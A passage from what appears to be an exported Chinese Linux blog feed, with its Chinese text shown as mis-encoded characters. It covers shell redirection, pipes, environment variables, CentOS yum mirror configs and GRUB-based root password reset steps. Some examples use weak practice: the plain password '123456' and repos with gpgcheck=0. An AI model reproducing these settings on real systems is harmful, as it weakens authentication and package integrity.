‡å‡†è¾“å…¥é‡å®šå‘</td><td>STDIN</td><td>0</td><td>é»˜è®¤ä»é”®ç›˜è¾“å…¥ï¼Œä¹Ÿå¯ä»å…¶ä»–æ–‡ä»¶æˆ–å‘½ä»¤ä¸­è¾“å…¥</td></tr><tr><td>æ ‡å‡†è¾“å‡ºé‡å®šå‘</td><td>STDOUT</td><td>1</td><td>é»˜è®¤è¾“å‡ºåˆ°å±å¹•</td></tr><tr><td>é”™è¯¯è¾“å‡ºé‡å®šå‘</td><td>STDERR</td><td>2</td><td>é»˜è®¤è¾“å‡ºåˆ°å±å¹•</td></tr></tbody></table><h3 id="2-è¾“å…¥é‡å®šå‘ä¸­ç”¨åˆ°çš„ç¬¦å·åŠå…¶ä½œç”¨"><a href="#2-è¾“å…¥é‡å®šå‘ä¸­ç”¨åˆ°çš„ç¬¦å·åŠå…¶ä½œç”¨" class="headerlink" title="2. è¾“å…¥é‡å®šå‘ä¸­ç”¨åˆ°çš„ç¬¦å·åŠå…¶ä½œç”¨"></a>2. è¾“å…¥é‡å®šå‘ä¸­ç”¨åˆ°çš„ç¬¦å·åŠå…¶ä½œç”¨</h3><table><thead><tr><th><strong>ç¬¦å·</strong></th><th><strong>ä½œç”¨</strong></th></tr></thead><tbody><tr><td>å‘½ä»¤ &lt; æ–‡ä»¶</td><td>å°†æ–‡ä»¶ä½œä¸ºå‘½ä»¤çš„æ ‡å‡†è¾“å…¥</td></tr><tr><td>å‘½ä»¤ &lt;&lt; åˆ†ç•Œç¬¦</td><td>ä»æ ‡å‡†è¾“å…¥ä¸­è¯»å…¥ï¼Œç›´åˆ°é‡è§åˆ†ç•Œç¬¦æ‰åœæ­¢</td></tr><tr><td>å‘½ä»¤ &lt; æ–‡ä»¶ 1 &gt; æ–‡ä»¶ 2</td><td>å°†æ–‡ä»¶ 1 ä½œä¸ºå‘½ä»¤çš„æ ‡å‡†è¾“å…¥å¹¶å°†æ ‡å‡†è¾“å‡ºåˆ°æ–‡ä»¶ 2</td></tr></tbody></table><h3 id="3-è¾“å‡ºé‡å®šå‘ä¸­ç”¨åˆ°çš„ç¬¦å·åŠå…¶ä½œç”¨"><a href="#3-è¾“å‡ºé‡å®šå‘ä¸­ç”¨åˆ°çš„ç¬¦å·åŠå…¶ä½œç”¨" class="headerlink" title="3. è¾“å‡ºé‡å®šå‘ä¸­ç”¨åˆ°çš„ç¬¦å·åŠå…¶ä½œç”¨"></a>3. è¾“å‡ºé‡å®šå‘ä¸­ç”¨åˆ°çš„ç¬¦å·åŠå…¶ä½œç”¨</h3><table><thead><tr><th><strong>ç¬¦å·</strong></th><th><strong>ä½œç”¨</strong></th></tr></thead><tbody><tr><td>å‘½ä»¤ &gt; æ–‡ä»¶</td><td>å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆæ¸…ç©ºåŸæœ‰æ–‡ä»¶çš„æ•°æ®ï¼‰</td></tr><tr><td>å‘½ä»¤ 2&gt; æ–‡ä»¶</td><td>å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆæ¸…ç©ºåŸæœ‰æ–‡ä»¶çš„æ•°æ®ï¼‰</td></tr><tr><td>å‘½ä»¤ &gt;&gt; æ–‡ä»¶</td><td>å°†æ ‡å‡†è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆè¿½åŠ åˆ°åŸæœ‰å†…å®¹çš„åé¢ï¼‰</td></tr><tr><td>å‘½ä»¤ 2&gt;&gt; æ–‡ä»¶</td><td>å°†é”™è¯¯è¾“å‡ºé‡å®šå‘åˆ°ä¸€ä¸ªæ–‡ä»¶ä¸­ï¼ˆè¿½åŠ åˆ°åŸæœ‰å†…å®¹çš„åé¢ï¼‰</td></tr></tbody></table><p>| å‘½ä»¤ &gt;&gt; æ–‡ä»¶ 2&gt;&amp;1<br>æˆ–<br>å‘½ä»¤ &amp;&gt;&gt; æ–‡ä»¶ | å°†æ ‡å‡†è¾“å‡ºä¸é”™è¯¯è¾“å‡ºå…±åŒå†™å…¥åˆ°æ–‡ä»¶ä¸­ï¼ˆè¿½åŠ åˆ°åŸæœ‰å†…å®¹çš„åé¢ï¼‰ |</p><blockquote><p>æ³¨æ„ï¼šå¯¹äºé‡å®šå‘ä¸­çš„æ ‡å‡†è¾“å‡ºæ¨¡å¼ï¼Œå¯ä»¥çœç•¥æ–‡ä»¶æè¿°ç¬¦ 1 ä¸å†™ï¼Œè€Œé”™è¯¯è¾“å‡ºæ¨¡å¼çš„æ–‡ä»¶æè¿°ç¬¦ 2 æ˜¯å¿…é¡»è¦å†™çš„ã€‚</p></blockquote><p>â€‹</p><h2 id="äºŒã€ç®¡é“å‘½ä»¤ç¬¦"><a href="#äºŒã€ç®¡é“å‘½ä»¤ç¬¦" class="headerlink" title="äºŒã€ç®¡é“å‘½ä»¤ç¬¦"></a>äºŒã€ç®¡é“å‘½ä»¤ç¬¦</h2><h3 id="1-å‘½ä»¤æ ¼å¼"><a href="#1-å‘½ä»¤æ ¼å¼" class="headerlink" title="1. å‘½ä»¤æ ¼å¼"></a>1. å‘½ä»¤æ ¼å¼</h3><p><code>"å‘½ä»¤A | å‘½ä»¤B"</code></p><h3 id="2-è§£é‡Š"><a href="#2-è§£é‡Š" class="headerlink" title="2. è§£é‡Š"></a>2. è§£é‡Š</h3><p>æŠŠå‰ä¸€ä¸ªå‘½ä»¤åŸæœ¬è¦è¾“å‡ºåˆ°å±å¹•çš„æ ‡å‡†æ­£å¸¸æ•°æ®å½“ä½œæ˜¯åä¸€ä¸ªå‘½ä»¤çš„æ ‡å‡†è¾“å…¥ã€‚</p><h3 id="3-ç¤ºä¾‹"><a href="#3-ç¤ºä¾‹" class="headerlink" title="3. ç¤ºä¾‹"></a>3. ç¤ºä¾‹</h3><p>ç»Ÿè®¡ nologin ç”¨æˆ·æ•°</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ <span class="token function">grep</span> <span class="token string">"/sbin/nologin"</span> /etc/passwd <span class="token operator">|</span> <span class="token function">wc</span> -l16<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä¿®æ”¹ç”¨æˆ·å¯†ç </p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo "123456" | passwd --stdin truda</span>Changing password <span class="token keyword">for</span> user truda.passwd: all authentication tokens updated successfully.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å‘é€é‚®ä»¶</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># mail -s "Readme" truda@163.com &lt;&lt; over</span><span class="token operator">></span> I think linux is very practical<span class="token operator">></span> I hope to learn <span class="token function">more</span><span class="token operator">></span> can you teach me ?<span class="token operator">></span> over<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¸‰ã€å‘½ä»¤è¡Œé€šé…ç¬¦"><a href="#ä¸‰ã€å‘½ä»¤è¡Œé€šé…ç¬¦" class="headerlink" title="ä¸‰ã€å‘½ä»¤è¡Œé€šé…ç¬¦"></a>ä¸‰ã€å‘½ä»¤è¡Œé€šé…ç¬¦</h2><h3 id="1-é€šé…ç¬¦åˆ—è¡¨"><a href="#1-é€šé…ç¬¦åˆ—è¡¨" class="headerlink" title="1. é€šé…ç¬¦åˆ—è¡¨"></a>1. é€šé…ç¬¦åˆ—è¡¨</h3><table><thead><tr><th><strong>é€šé…ç¬¦</strong></th><th><strong>è§£é‡Š</strong></th></tr></thead><tbody><tr><td>æ˜Ÿå·ï¼ˆ*ï¼‰</td><td>ä»£è¡¨åŒ¹é…é›¶ä¸ªæˆ–å¤šä¸ªå­—ç¬¦</td></tr><tr><td>é—®å·ï¼ˆ?ï¼‰</td><td>ä»£è¡¨åŒ¹é…å•ä¸ªå­—ç¬¦</td></tr><tr><td>[0-9]</td><td>ä»£è¡¨åŒ¹é… 0 ï½ 9 ä¹‹é—´çš„å•ä¸ªæ•°å­—çš„å­—ç¬¦</td></tr><tr><td>[abc]</td><td>ä»£è¡¨åŒ¹é… aã€bã€c ä¸‰ä¸ªå­—ç¬¦ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦</td></tr></tbody></table><h3 id="2-ç¤ºä¾‹"><a href="#2-ç¤ºä¾‹" class="headerlink" title="2. ç¤ºä¾‹"></a>2. ç¤ºä¾‹</h3><p>åŒ¹é…æ‰€æœ‰åœ¨/dev ç›®å½•ä¸­ä¸”ä»¥ sda å¼€å¤´çš„æ–‡ä»¶</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ ll /dev/sda*brw-rw----. 1 root disk 8, 0 Jul 22 10:43 /dev/sdabrw-rw----. 1 root disk 8, 1 Jul 22 10:43 /dev/sda1brw-rw----. 1 root disk 8, 2 Jul 22 10:43 /dev/sda2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å››ã€å¸¸ç”¨è½¬ä¹‰å­—ç¬¦"><a href="#å››ã€å¸¸ç”¨è½¬ä¹‰å­—ç¬¦" class="headerlink" title="å››ã€å¸¸ç”¨è½¬ä¹‰å­—ç¬¦"></a>å››ã€å¸¸ç”¨è½¬ä¹‰å­—ç¬¦</h2><table><thead><tr><th><strong>å­—ç¬¦</strong></th><th><strong>è§£é‡Š</strong></th></tr></thead><tbody><tr><td>åæ–œæ ï¼ˆ\ï¼‰</td><td>ä½¿åæ–œæ åé¢çš„ä¸€ä¸ªå˜é‡å˜ä¸ºå•çº¯çš„å­—ç¬¦ä¸²</td></tr><tr><td>å•å¼•å·ï¼ˆâ€™â€™ï¼‰</td><td>è½¬ä¹‰å…¶ä¸­æ‰€æœ‰çš„å˜é‡ä¸ºå•çº¯çš„å­—ç¬¦ä¸²</td></tr><tr><td>åŒå¼•å·ï¼ˆâ€â€ï¼‰</td><td>ä¿ç•™å…¶ä¸­çš„å˜é‡å±æ€§ï¼Œä¸è¿›è¡Œè½¬ä¹‰å¤„ç†</td></tr><tr><td>åå¼•å·ï¼ˆ``ï¼‰</td><td>æŠŠå…¶ä¸­çš„å‘½ä»¤æ‰§è¡Œåè¿”å›ç»“æœ</td></tr></tbody></table><h2 id="äº”ã€ç¯å¢ƒå˜é‡"><a href="#äº”ã€ç¯å¢ƒå˜é‡" class="headerlink" title="äº”ã€ç¯å¢ƒå˜é‡"></a>äº”ã€ç¯å¢ƒå˜é‡</h2><h3 id="1-ä»€ä¹ˆæ˜¯ç¯å¢ƒå˜é‡"><a href="#1-ä»€ä¹ˆæ˜¯ç¯å¢ƒå˜é‡" class="headerlink" title="1. ä»€ä¹ˆæ˜¯ç¯å¢ƒå˜é‡"></a>1. ä»€ä¹ˆæ˜¯ç¯å¢ƒå˜é‡</h3><p>ç¯å¢ƒå˜é‡ = å›ºå®šçš„å˜é‡å + ç”¨æˆ·æˆ–ç³»ç»Ÿè®¾ç½®çš„å˜é‡å€¼</p><h3 id="2-Linux-ç³»ç»Ÿä¸­æœ€é‡è¦çš„-10-ä¸ªç¯å¢ƒå˜é‡"><a href="#2-Linux-ç³»ç»Ÿä¸­æœ€é‡è¦çš„-10-ä¸ªç¯å¢ƒå˜é‡" class="headerlink" title="2. Linux ç³»ç»Ÿä¸­æœ€é‡è¦çš„ 10 ä¸ªç¯å¢ƒå˜é‡"></a>2. Linux ç³»ç»Ÿä¸­æœ€é‡è¦çš„ 10 ä¸ªç¯å¢ƒå˜é‡</h3><table><thead><tr><th><strong>å˜é‡åç§°</strong></th><th><strong>ä½œç”¨</strong></th></tr></thead><tbody><tr><td>HOME</td><td>ç”¨æˆ·çš„ä¸»ç›®å½•ï¼ˆå³å®¶ç›®å½•ï¼‰</td></tr><tr><td>SHELL</td><td>ç”¨æˆ·åœ¨ä½¿ç”¨çš„ Shell è§£é‡Šå™¨åç§°</td></tr><tr><td>HISTSIZE</td><td>è¾“å‡ºçš„å†å²å‘½ä»¤è®°å½•æ¡æ•°</td></tr><tr><td>HISTFILESIZE</td><td>ä¿å­˜çš„å†å²å‘½ä»¤è®°å½•æ¡æ•°</td></tr><tr><td>MAIL</td><td>é‚®ä»¶ä¿å­˜è·¯å¾„</td></tr><tr><td>LANG</td><td>ç³»ç»Ÿè¯­è¨€ã€è¯­ç³»åç§°</td></tr><tr><td>RANDOM</td><td>ç”Ÿæˆä¸€ä¸ªéšæœºæ•°å­—</td></tr><tr><td>PS1</td><td>Bash è§£é‡Šå™¨çš„æç¤ºç¬¦</td></tr><tr><td>PATH</td><td>å®šä¹‰è§£é‡Šå™¨æœç´¢ç”¨æˆ·æ‰§è¡Œå‘½ä»¤çš„è·¯å¾„</td></tr><tr><td>EDITOR</td><td>ç”¨æˆ·é»˜è®¤çš„æ–‡æœ¬ç¼–è¾‘å™¨</td></tr></tbody></table><h3 id="3-å¸¸ç”¨æ“ä½œ"><a href="#3-å¸¸ç”¨æ“ä½œ" class="headerlink" title="3. å¸¸ç”¨æ“ä½œ"></a>3. å¸¸ç”¨æ“ä½œ</h3><p>æŸ¥çœ‹ç¯å¢ƒå˜é‡çš„å€¼</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ <span class="token keyword">echo</span> <span class="token variable">$HOME</span>/home/truda<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>è®¾ç½®ä¸´æ—¶ç¯å¢ƒå˜é‡</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ WORKDIR<span class="token operator">=</span>/home/truda/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è®¾ç½®æ°¸ä¹…ç¯å¢ƒå˜é‡</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># ç³»ç»Ÿç¯å¢ƒå˜é‡</span><span class="token keyword">echo</span> <span class="token string">'export WORKDIR=/home/truda/'</span> <span class="token operator">>></span> /etc/profile<span class="token comment" spellcheck="true"># ç”¨æˆ·ç¯å¢ƒå˜é‡</span><span class="token keyword">echo</span> <span class="token string">'export WORKDIR=/home/truda/'</span> <span class="token operator">>></span> ~/.bashrc<span class="token keyword">echo</span> <span class="token string">'export WORKDIR=/home/truda/'</span> <span class="token operator">>></span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æå‡ç¯å¢ƒå˜é‡ä¸ºå…¨å±€å˜é‡</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ WORKDIR<span class="token operator">=</span>/home/truda<span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ <span class="token function">export</span> WORKDIR<span class="token punctuation">[</span>truda@localhost ~<span class="token punctuation">]</span>$ <span class="token function">su</span> rootPassword:<span class="token punctuation">[</span>root@localhost truda<span class="token punctuation">]</span><span class="token comment" spellcheck="true"># echo $WORKDIR</span>/home/truda<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centosç½‘ç»œYumæºé…ç½®</title>
      <link href="/post/59e3b058.html"/>
      <url>/post/59e3b058.html</url>
      
        <content type="html"><![CDATA[<h1 id="Centos-ç½‘ç»œ-Yum-æºé…ç½®"><a href="#Centos-ç½‘ç»œ-Yum-æºé…ç½®" class="headerlink" title="Centos ç½‘ç»œ Yum æºé…ç½®"></a>Centos ç½‘ç»œ Yum æºé…ç½®</h1><h2 id="ä¸€ã€åŸºæœ¬å‘½ä»¤"><a href="#ä¸€ã€åŸºæœ¬å‘½ä»¤" class="headerlink" title="ä¸€ã€åŸºæœ¬å‘½ä»¤"></a>ä¸€ã€åŸºæœ¬å‘½ä»¤</h2><ol><li>è·å–å½“å‰ç³»ç»Ÿç‰ˆæœ¬ ï¼šcat /etc/centos-release</li><li>è¿›å…¥ yum æºé…ç½®ç›®å½• ï¼šcd /etc/yum.repos.d/</li><li>å¤‡ä»½ yum æº ï¼šmv CentOS-Base.repo CentOS-Base.repo.bak</li><li>ä¸‹è½½å›½å†…æº ï¼š wget -O /etc/yum.repos.d/CentOS-Base.repo å¯¹åº”ç³»ç»Ÿç‰ˆæœ¬æºåœ°å€</li><li>æ¸…é™¤ç¼“å­˜ï¼šyum clean all</li><li>ç”Ÿæˆç¼“å­˜ï¼šyum makecache</li><li>æ›´æ–°è½¯ä»¶ï¼šyum update -y</li></ol><h2 id="äºŒã€Centos-7-æº"><a href="#äºŒã€Centos-7-æº" class="headerlink" title="äºŒã€Centos 7 æº"></a>äºŒã€Centos 7 æº</h2><h3 id="1-é˜¿é‡Œæº"><a href="#1-é˜¿é‡Œæº" class="headerlink" title="1. é˜¿é‡Œæº"></a>1. é˜¿é‡Œæº</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>aliyun-os<span class="token punctuation">]</span>name<span class="token operator">=</span>aliyun-osbaseurl<span class="token operator">=</span>https://mirrors.aliyun.com/centos/7/os/x86_64/enabled<span class="token operator">=</span>1gpgcheck<span class="token operator">=</span>0<span class="token punctuation">[</span>aliyun-epel<span class="token punctuation">]</span>name<span class="token operator">=</span>aliyun-epelbaseurl<span class="token operator">=</span>https://mirrors.aliyun.com/epel/7/x86_64/enabled<span class="token operator">=</span>1gpgcheck<span class="token operator">=</span>0<span class="token punctuation">[</span>aliyun-extra<span class="token punctuation">]</span>name<span class="token operator">=</span>aliyun-extrabaseurl<span class="token operator">=</span>https://mirrors.aliyun.com/centos/7/extras/x86_64/enabled<span class="token operator">=</span>1gpgcheck<span class="token operator">=</span>0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-Centos7-ç½‘æ˜“æº"><a href="#2-Centos7-ç½‘æ˜“æº" class="headerlink" title="2. Centos7 ç½‘æ˜“æº"></a>2. Centos7 ç½‘æ˜“æº</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>net-163<span class="token punctuation">]</span>name<span class="token operator">=</span>www.163.combaseurl<span class="token operator">=</span>http://mirrors.163.com/centos/7/os/x86_64/enabled<span class="token operator">=</span>1gpgcheck<span class="token operator">=</span>1gpgkey<span class="token operator">=</span>http://mirrors.163.com/centos/7/os/x86_64/RPM-GPG-KEY-CentOS-7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ä¸‰ã€å…¶å®ƒ"><a href="#ä¸‰ã€å…¶å®ƒ" class="headerlink" title="ä¸‰ã€å…¶å®ƒ"></a>ä¸‰ã€å…¶å®ƒ</h2><h3 id="1-é˜¿é‡Œäº‘"><a href="#1-é˜¿é‡Œäº‘" class="headerlink" title="1. é˜¿é‡Œäº‘"></a>1. é˜¿é‡Œäº‘</h3><p>CentOS 5ï¼š<a href="http://mirrors.aliyun.com/repo/Centos-5.repo">http://mirrors.aliyun.com/repo/Centos-5.repo</a><br>CentOS 6ï¼š<a href="http://mirrors.aliyun.com/repo/Centos-6.repo">http://mirrors.aliyun.com/repo/Centos-6.repo</a><br>CentOS 7ï¼š<a href="http://mirrors.aliyun.com/repo/Centos-7.repo">http://mirrors.aliyun.com/repo/Centos-7.repo</a><br>â€‹</p><h3 id="2-ç½‘æ˜“"><a href="#2-ç½‘æ˜“" class="headerlink" title="2. ç½‘æ˜“"></a>2. ç½‘æ˜“</h3><p>CentOS 5ï¼š<a href="http://mirrors.163.com/.help/CentOS5-Base-163.repo">http://mirrors.163.com/.help/CentOS5-Base-163.repo</a><br>CentOS 6ï¼š<a href="http://mirrors.163.com/.help/CentOS6-Base-163.repo">http://mirrors.163.com/.help/CentOS6-Base-163.repo</a><br>CentOS 7ï¼š<a href="http://mirrors.163.com/.help/CentOS7-Base-163.repo">http://mirrors.163.com/.help/CentOS7-Base-163.repo</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> CentOS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux å¿˜è®°å¯†ç é‡ç½®</title>
      <link href="/post/58e6bfe9.html"/>
      <url>/post/58e6bfe9.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-å¿˜è®°å¯†ç é‡ç½®"><a href="#Linux-å¿˜è®°å¯†ç é‡ç½®" class="headerlink" title="Linux å¿˜è®°å¯†ç é‡ç½®"></a>Linux å¿˜è®°å¯†ç é‡ç½®</h1><h2 id="ä¸€ã€RHEL-6-æˆ–-CentOS-6"><a href="#ä¸€ã€RHEL-6-æˆ–-CentOS-6" class="headerlink" title="ä¸€ã€RHEL 6 æˆ– CentOS 6"></a>ä¸€ã€RHEL 6 æˆ– CentOS 6</h2><ol><li>å…ˆé‡å¯ï¼Œåœ¨å¼€æœºçš„æ—¶å€™æŒ‰ä»»æ„é”®ï¼Œä¸€èˆ¬æ˜¯ä¸Šä¸‹é”®ï¼Œè¿›å…¥ menu</li><li>é€‰æ‹©å¯¹åº”çš„ kernelï¼ŒæŒ‰ e è¿›è¡Œç¼–è¾‘</li><li>è¿›å…¥ç¼–è¾‘ç•Œé¢ååœ¨ quiet åé¢æŒ‰ç©ºæ ¼ï¼Œè¾“å…¥ 1 ï¼ŒæŒ‰å›è½¦</li><li>åœ¨ menu ç•Œé¢æŒ‰ b ï¼Œè®© boot å¼•å¯¼å¯åŠ¨ç³»ç»Ÿ</li><li>è¿›å…¥å•ç”¨æˆ·æ¨¡å¼ï¼Œè¾“å…¥ passwd æ”¹å¯†ç </li><li>reboot é‡å¯</li></ol><h2 id="äºŒã€RHEL-7-æˆ–-CentOS-7"><a href="#äºŒã€RHEL-7-æˆ–-CentOS-7" class="headerlink" title="äºŒã€RHEL 7 æˆ– CentOS 7"></a>äºŒã€RHEL 7 æˆ– CentOS 7</h2><ol><li>å…ˆé‡å¯ï¼Œåœ¨å¼€æœºçš„æ—¶å€™æŒ‰ä»»æ„é”®ï¼Œä¸€èˆ¬æ˜¯ä¸Šä¸‹é”®ï¼Œè¿›å…¥ menu</li><li>é€‰æ‹©è¦ä¿®æ”¹çš„ kernelï¼ŒæŒ‰ e è¿›è¡Œç¼–è¾‘</li><li>åœ¨ linux16 è¿™ä¸€è¡Œçš„æœ€åè¾“å…¥ rd.break ï¼Œè®°ä½è¿™ä¸ªé…ç½®ä¹‹å‰è¦æœ‰ä¸€ä¸ªç©ºæ ¼ï¼ŒæŒ‰ Ctrl+x å¯åŠ¨ç´§æ€¥æ•‘æ´æ¨¡å¼</li><li>è¿›å…¥ç´§æ€¥æ•‘æ´æ¨¡å¼ï¼Œä»¥è¯»å†™çš„æ–¹å¼é‡æ–°æŒ‚è½½æ ¹åˆ†åŒºï¼š mount -o remount,rw /sysroot</li><li>æ”¹å˜æ ¹åˆ†åŒºï¼Œ chroot /sysroot</li><li>æ”¹å¯†ç ï¼Œ passwd</li><li>é‡æ–°æ‰“æ ‡ç­¾ï¼š touch /.autorelabel</li><li>exit é€€å‡º shï¼Œ reboot é‡å¯ç³»ç»Ÿ</li></ol><p>â€‹</p><h2 id="ä¸‰ã€RHEL-8-æˆ–-CentOS-8"><a href="#ä¸‰ã€RHEL-8-æˆ–-CentOS-8" class="headerlink" title="ä¸‰ã€RHEL 8 æˆ– CentOS 8"></a>ä¸‰ã€RHEL 8 æˆ– CentOS 8</h2><ol><li>å…ˆé‡å¯ï¼Œåœ¨å¼€æœºçš„æ—¶å€™æŒ‰ä»»æ„é”®ï¼Œä¸€èˆ¬æ˜¯ä¸Šä¸‹é”®ï¼Œè¿›å…¥ menu</li><li>é€‰æ‹©è¦ä¿®æ”¹çš„ kernelï¼ŒæŒ‰ e è¿›è¡Œç¼–è¾‘</li><li>åœ¨ä»¥ linux å¼€å¤´çš„è¡Œï¼Œå®ƒçœ‹èµ·æ¥åƒä¸‹é¢çš„è¾“å‡ºï¼Œè¿™ä¸€è¡Œçš„æœ€åè¾“å…¥ rd.break ï¼Œè®°ä½è¿™ä¸ªé…ç½®ä¹‹å‰è¦æœ‰ä¸€ä¸ªç©ºæ ¼ï¼ŒæŒ‰ Ctrl+x å¯åŠ¨ç´§æ€¥æ•‘æ´æ¨¡å¼</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2021/png/519483/1628080571070-fff75cab-9b3e-46de-9d1c-57cb8cbb91e5.png#clientId=ue392a8d7-2498-4&amp;from=paste&amp;height=138&amp;id=u473a4c30&amp;margin=%5Bobject%20Object%5D&amp;name=image.png&amp;originHeight=138&amp;originWidth=721&amp;originalType=binary%E2%88%B6=1&amp;size=45587&amp;status=done&amp;style=none&amp;taskId=ufac2348c-c728-42cf-95c7-034f23fc71f&amp;width=721" alt="image.png"></p><ol start="4"><li>è¿›å…¥ç´§æ€¥æ•‘æ´æ¨¡å¼ï¼Œä»¥è¯»å†™çš„æ–¹å¼é‡æ–°æŒ‚è½½æ ¹åˆ†åŒºï¼š mount -o remount,rw /sysroot</li><li>æ”¹å˜æ ¹åˆ†åŒºï¼Œ chroot /sysroot</li><li>æ”¹å¯†ç ï¼Œ passwd</li><li>é‡æ–°æ‰“æ ‡ç­¾ï¼š touch /.autorelabel</li><li>exit é€€å‡º shï¼Œ reboot é‡å¯ç³»ç»Ÿ</li></ol><p>â€‹</p><h2 id="å››ã€Debian-ç³»åˆ—"><a href="#å››ã€Debian-ç³»åˆ—" class="headerlink" title="å››ã€Debian ç³»åˆ—"></a>å››ã€Debian ç³»åˆ—</h2><ol><li>å¼€æœºæŒ‰ä½ä»»ä½•é”®ï¼ˆshiftï¼‰åœä½ grub èœå•</li><li>è¿›å…¥ advanced option for ubuntu</li><li>å‡ºç°çš„èœå•ä¸­ï¼Œå…‰æ ‡ç§»åŠ¨è‡³â€¦ï¼ˆrecovery modeï¼‰</li><li>æŒ‰ e è¿›å…¥ç¼–è¾‘</li><li>æ‰¾åˆ° ro recovery nomodeset æ›´æ”¹ä¸º rw single init=/bin/bash</li><li>æœ€åæŒ‰ Ctrl-x æˆ–è€… F10 å¯åŠ¨ä¿®å¤æ¨¡å¼</li><li>è¾“å…¥ passwd ä¿®æ”¹ root å¯†ç </li><li>é‡å¯</li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> å¯†ç  </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxç³»ç»Ÿæ›´æ–°æºå¤§å…¨</title>
      <link href="/post/722c0af7.html"/>
      <url>/post/722c0af7.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-ç³»ç»Ÿæ›´æ–°æºå¤§å…¨"><a href="#Linux-ç³»ç»Ÿæ›´æ–°æºå¤§å…¨" class="headerlink" title="Linux ç³»ç»Ÿæ›´æ–°æºå¤§å…¨"></a>Linux ç³»ç»Ÿæ›´æ–°æºå¤§å…¨</h1><h2 id="ä¸€ã€é•œåƒç«™"><a href="#ä¸€ã€é•œåƒç«™" class="headerlink" title="ä¸€ã€é•œåƒç«™"></a>ä¸€ã€é•œåƒç«™</h2><ol><li><a href="https://developer.aliyun.com/mirror/">é˜¿é‡Œäº‘å®˜æ–¹é•œåƒç«™</a></li><li><a href="https://mirrors.huaweicloud.com/home">åä¸ºå¼€æºé•œåƒç«™</a></li><li><a href="https://mirrors.163.com/">ç½‘æ˜“å¼€æºé•œåƒç«™</a></li><li><a href="https://mirrors.cloud.tencent.com/">è…¾è®¯è½¯ä»¶æº</a></li><li><a href="https://mirrors.ustc.edu.cn/help/index.html">ä¸­ç§‘å¤§æº</a></li><li><a href="https://mirrors.tuna.tsinghua.edu.cn/">æ¸…åå¤§å­¦å¼€æºè½¯ä»¶é•œåƒç«™</a></li></ol><h2 id="äºŒã€æ›´æ–°æºé…ç½®æ–‡ä»¶"><a href="#äºŒã€æ›´æ–°æºé…ç½®æ–‡ä»¶" class="headerlink" title="äºŒã€æ›´æ–°æºé…ç½®æ–‡ä»¶"></a>äºŒã€æ›´æ–°æºé…ç½®æ–‡ä»¶</h2><ol><li>RedHat ç³»åˆ—</li></ol><p><strong>/etc/yum.repos.d/*.repo</strong></p><ol start="2"><li>Debian ç³»åˆ—</li></ol><p><strong>/etc/apt/sources.list</strong></p><h2 id="ä¸‰ã€å¤‡ä»½é…ç½®æ–‡ä»¶"><a href="#ä¸‰ã€å¤‡ä»½é…ç½®æ–‡ä»¶" class="headerlink" title="ä¸‰ã€å¤‡ä»½é…ç½®æ–‡ä»¶"></a>ä¸‰ã€å¤‡ä»½é…ç½®æ–‡ä»¶</h2><ol><li>RedHat ç³»åˆ—</li></ol><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">mv</span> /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="2"><li>Debian ç³»åˆ—</li></ol><pre 